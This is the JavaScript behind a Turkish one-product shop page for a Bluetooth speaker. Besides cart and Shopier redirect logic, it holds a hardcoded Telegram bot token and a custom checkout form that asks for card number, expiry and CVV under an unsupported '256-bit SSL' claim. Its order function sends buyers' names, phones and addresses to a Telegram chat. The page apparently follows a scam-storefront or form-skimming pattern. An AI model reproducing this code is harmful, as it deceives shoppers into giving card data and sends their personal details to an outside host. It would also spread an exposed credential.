// ================== SHOPIER LINK ==================
const SHOPIER_LINK = "https://www.shopier.com/m/orders.php";

// ================== TELEGRAM AYARLARI ==================
const TELEGRAM_TOKEN = "8572363144:AAFLFLu2b4MKvm-ARzyUAxV9GqPPcQ2xd-4";
const TELEGRAM_CHAT_ID = "1538267112";

// ================== RESİM DEĞİŞTİRME ==================
const images = document.querySelectorAll('.product-images img');
let activeImg = document.querySelector('.active-img');

images.forEach(img => {
  img.addEventListener('click', () => {
    if (activeImg) activeImg.classList.remove('active-img');
    img.classList.add('active-img');
    activeImg = img;
  });
});

// ================== SEPET STATE ==================
let cart = {
  name: "Su Geçirmez Bluetooth Hoparlör",
  price: 500,
  qty: 0
};

// ================== ELEMENTLER ==================
const cartPanel    = document.getElementById('cartPanel');
const cartToggle   = document.getElementById('cartToggle');
const closeCart    = document.getElementById('closeCart');
const addToCartBtn = document.getElementById('addToCart');
const buyNowBtn    = document.getElementById('buyNow');

const panelTitle   = document.getElementById('panelTitle');
const panelContent = document.getElementById('panelContent');
const panelFooter  = document.getElementById('panelFooter');

// ================== PANEL AÇ / KAPAT ==================
cartToggle.addEventListener('click', openCart);
closeCart.addEventListener('click', () => {
  cartPanel.classList.remove('active');
});

// ================== SEPET BUTONLARI ==================
addToCartBtn.addEventListener('click', () => {
  cart.qty++;
  openCart();
});

buyNowBtn.addEventListener('click', () => {
  if (cart.qty === 0) cart.qty = 1;
  notifyBeforePayment();
  window.location.href = SHOPIER_LINK;
});

// ================== SEPET PANELİ ==================
function openCart() {
  panelTitle.innerText = "Sepetim";

  if (cart.qty === 0) {
    panelContent.innerHTML = `<p>Sepetiniz boş.</p>`;
    panelFooter.innerHTML = ``;
  } else {
    const total = cart.qty * cart.price;

    panelContent.innerHTML = `
      <p><strong>${cart.name}</strong></p>
      <p>Birim Fiyat: ${cart.price} TL</p>

      <div style="display:flex;align-items:center;gap:10px;margin:12px 0;">
        <button onclick="decreaseQty()">➖</button>
        <strong>${cart.qty}</strong>
        <button onclick="increaseQty()">➕</button>
      </div>

      <p><strong>Toplam: ${total} TL</strong></p>
      <button onclick="removeItem()">❌ Ürünü Kaldır</button>
    `;

    panelFooter.innerHTML = `
      <button onclick="goShopier()">Ödemeye Geç</button>
    `;
  }

  cartPanel.classList.add('active');
}

// ================== SHOPIER YÖNLENDİRME ==================
function goShopier() {
  notifyBeforePayment();
  window.location.href = SHOPIER_LINK;
}

// ================== ADET ==================
function increaseQty() { cart.qty++; openCart(); }
function decreaseQty() { cart.qty--; if(cart.qty<1)cart.qty=1; openCart(); }
function removeItem() { cart.qty=0; openCart(); }

// ================== ÖDEME PANELİ (BOZULMADI) ==================
function openCheckout() {
  if (cart.qty === 0) { alert("Sepet boş!"); return; }

  const total = cart.qty * cart.price;
  panelTitle.innerText = "Güvenli Ödeme";

  panelContent.innerHTML = `
    <label>Ad Soyad</label>
    <input id="name" placeholder="Ad Soyad">

    <label>Telefon</label>
    <input id="phone" placeholder="05xx xxx xx xx" inputmode="numeric">

    <label>Kart Numarası</label>
    <input id="card" placeholder="1234 5678 9012 3456" inputmode="numeric">

    <div style="display:flex;gap:10px;">
      <div style="flex:1;">
        <label>SKT</label>
        <input id="exp" placeholder="MM/YY" inputmode="numeric">
      </div>
      <div style="flex:1;">
        <label>CVV</label>
        <input id="cvv" placeholder="123" inputmode="numeric">
      </div>
    </div>

    <label>Adres</label>
    <textarea id="address" placeholder="Teslimat adresi"></textarea>

    <p style="margin-top:10px;">
      <strong>Toplam: ${total} TL</strong>
    </p>

    <small style="color:#666;">
      🔒 256-bit SSL ile korunmaktadır
    </small>
  `;

  panelFooter.innerHTML = `
    <button onclick="completeOrder()">Ödemeyi Tamamla</button>
  `;

  cartPanel.classList.add('active');
}

// ================== INPUT FORMATLAMA ==================
document.addEventListener("input", function (e) {
  if (e.target.id === "phone") {
    let v = e.target.value.replace(/\D/g,"").substring(0,10);
    if(v.length>3 && v.length<=6) v=v.slice(0,3)+" "+v.slice(3);
    else if(v.length>6) v=v.slice(0,3)+" "+v.slice(3,6)+" "+v.slice(6);
    e.target.value=v;
  }
  if(e.target.id==="card") {
    let v=e.target.value.replace(/\D/g,"").substring(0,16);
    e.target.value=v.match(/.{1,4}/g)?.join(" ")||"";
  }
  if(e.target.id==="exp") {
    let v=e.target.value.replace(/\D/g,"").substring(0,4);
    e.target.value = v.length>2 ? v.slice(0,2)+"/"+v.slice(2) : v;
  }
  if(e.target.id==="cvv") {
    e.target.value=e.target.value.replace(/\D/g,"").substring(0,3);
  }
});

// ================== TELEGRAM ==================
function sendTelegramMessage(message){
  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    })
  });
}

// ================== SHOPIER ÖNCESİ BİLDİRİM ==================
function notifyBeforePayment() {
  const total = cart.qty * cart.price;

  const message = `
🛒 Shopier'e yönlendirilen sipariş

Ürün: ${cart.name}
Adet: ${cart.qty}
Toplam: ${total} TL
  `;

  sendTelegramMessage(message);
}

// ================== SİPARİŞ TAMAMLAMA (BOZULMADI) ==================
function completeOrder(){
  const name    = document.getElementById("name").value.trim();
  const phone   = document.getElementById("phone").value.trim();
  const card    = document.getElementById("card").value.trim();
  const exp     = document.getElementById("exp").value.trim();
  const cvv     = document.getElementById("cvv").value.trim();
  const address = document.getElementById("address").value.trim();

  if(!name||!phone||!card||!exp||!cvv||!address){
    alert("Lütfen tüm alanları eksiksiz doldurun!");
    return;
  }

  const total = cart.qty * cart.price;

  const message = `
🛒 YENİ SİPARİŞ!

Ürün: ${cart.name}
Adet: ${cart.qty}
Toplam: ${total} TL

👤 ${name}
📞 ${phone}
📍 ${address}
  `;

  sendTelegramMessage(message);
  window.location.href = SHOPIER_LINK;

  cart.qty = 0;
  cartPanel.classList.remove('active');
}
